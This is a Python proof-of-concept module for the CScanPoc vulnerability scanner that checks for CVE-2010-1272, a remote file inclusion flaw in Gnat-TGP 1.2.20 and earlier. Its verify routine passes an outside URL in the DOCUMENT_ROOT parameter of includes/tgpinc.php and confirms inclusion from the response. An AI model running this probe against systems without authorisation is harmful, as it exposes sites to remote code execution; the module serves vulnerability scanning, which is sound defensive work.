# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Gnat-TGP_0000'  # 平台漏洞编号
    name = 'Gnat-TGP <= 1.2.20 Remote File Include Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-08-22'  # 漏洞公布时间
    desc = '''
        Gnat-TGP的脚本includes/tgpinc.php存在PHP远程文件包含漏洞。远程攻击者可以DOCUMENT_ROOT参数中的URL，执行任意的PHP代码。
        Gnat-TGP <= 1.2.20版本远程文件包含漏洞。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2010-4966'
    cnvd_id = 'CNVD-2010-4966'  # cnvd漏洞编号
    cve_id = 'CVE-2010-1272'  # cve编号
    product = 'Gnat-TGP'  # 漏洞组件名称
    product_version = '<= 1.2.20'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7cb3950c-0753-4b8f-80a6-486862974eba'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/includes/tgpinc.php?DOCUMENT_ROOT=http://baidu.com/robots.txt'
            response = requests.get(vul_url).text
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
